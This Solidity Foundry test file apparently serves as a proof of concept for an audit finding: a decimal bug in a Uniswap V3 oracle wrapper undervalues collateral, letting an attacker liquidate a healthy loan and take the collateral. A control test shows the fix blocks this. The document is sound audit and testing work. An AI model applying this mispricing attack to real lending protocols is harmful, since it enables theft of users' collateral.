// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    UniswapV3OracleWrapper,
    UniswapV3OracleWrapperFixed,
    LendingPool,
    MiniToken,
    PositionData
} from "./15979-h-06-discrepency-in-the-uniswap-v3-position-price-calculatio.sol";

contract UniV3DecimalMispriceTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x0000000000000000000000000000000000009901;

    uint160 internal constant MIN_SQRT = 4295128739;
    uint160 internal constant MAX_SQRT = 1461446703485210103287273052203988822378723970342;

    // Exact expected values (see explore/exact integer model; deterministic).
    uint160 internal constant PC = 2505414483750416458579128;                  // correct sqrtPriceX96
    uint160 internal constant PB = 2505414483750416458579128823926757;         // buggy sqrtPriceX96 (= PC * 1e9)
    uint256 internal constant V_CORRECT = 31622776601684586671599776601682;    // true collateral value
    uint256 internal constant V_BUGGY = 63245553203366999999999;               // under-valued collateral value

    function test_exploit_decimalMisprice_wrongfulLiquidationTheft() public {
        Exploit e = new Exploit();
        e.run();

        // 1) The verbatim decimal branch inflates sqrtPriceX96 by exactly 10^9x.
        assertEq(e.buggySqrtPriceX96(), PB, "buggy sqrtPriceX96");
        assertEq(e.fixedSqrtPriceX96(), PC, "fixed sqrtPriceX96");
        assertEq(uint256(e.buggySqrtPriceX96()) / uint256(e.fixedSqrtPriceX96()), 1e9, "sqrtPrice inflated 1e9x");

        // 2) That inflation UNDER-values the collateral via getAmountsForLiquidity/getTokenPrice.
        assertEq(e.correctValue(), V_CORRECT, "true collateral value");
        assertEq(e.buggyValue(), V_BUGGY, "under-valued collateral value");
        assertGt(e.correctValue() / e.buggyValue(), 1e8, "collateral under-valued >1e8x");

        // 3) HARM: a healthy 40%-LTV loan is spuriously liquidated; the attacker seizes the
        //    full-value collateral for a fraction of its worth. Stolen COLL lands at the attacker.
        assertEq(e.seizedColl(), V_CORRECT, "attacker seized full-value collateral");
        assertGt(e.seizedColl(), e.debtRepaid(), "seized collateral exceeds debt repaid (theft)");
        MiniToken coll = MiniToken(e.collTokenAddr());
        assertEq(coll.balanceOf(ATTACKER), V_CORRECT, "attacker EOA holds stolen collateral");

        // Net theft magnitude: full collateral minus the small debt repaid.
        uint256 netTheft = e.seizedColl() - e.debtRepaid();
        emit log_named_uint("stolen collateral (COLL wei)", e.seizedColl());
        emit log_named_uint("debt repaid (BRW wei)", e.debtRepaid());
        emit log_named_uint("net theft (value units)", netTheft);
        assertGt(netTheft, 0, "positive net theft");
    }

    /// @notice Negative control: the recommended fixed divisor prices the collateral correctly,
    ///         the identical loan stays healthy, and the liquidation reverts — no theft.
    function test_control_fixedDivisor_loanHealthy_noLiquidation() public {
        MiniToken borrowT = new MiniToken("Borrow", "BRW");
        MiniToken collT = new MiniToken("Collateral", "COLL");
        UniswapV3OracleWrapperFixed fixedO = new UniswapV3OracleWrapperFixed();
        LendingPool pool = new LendingPool(address(fixedO), address(borrowT), address(collT));

        PositionData memory pos = PositionData({
            sqrtRatioAX96: MIN_SQRT,
            sqrtRatioBX96: MAX_SQRT,
            liquidity: 1e18,
            token0Price: 1e18,
            token1Price: 1e18,
            token0Decimal: 9,
            token1Decimal: 18
        });

        uint256 collAmount = V_CORRECT;
        uint256 debt = (V_CORRECT * 4000) / 10000; // same 40%-LTV loan

        collT.mint(address(this), collAmount);
        collT.approve(address(pool), collAmount);
        pool.originateLoan(1, pos, collAmount, debt, VICTIM);

        // Correctly valued: collateralValue * 50% >= debt -> healthy -> not liquidatable.
        assertEq(pool.collateralValue(1), V_CORRECT, "fixed oracle values collateral correctly");
        assertFalse(pool.isLiquidatable(1), "loan is healthy under fixed oracle");

        borrowT.mint(address(this), debt);
        borrowT.approve(address(pool), debt);
        vm.expectRevert(bytes("healthy"));
        pool.liquidate(1);

        // No collateral seized; attacker gains nothing under the fix.
        assertEq(collT.balanceOf(ATTACKER), 0, "no theft under fixed divisor");
    }
}
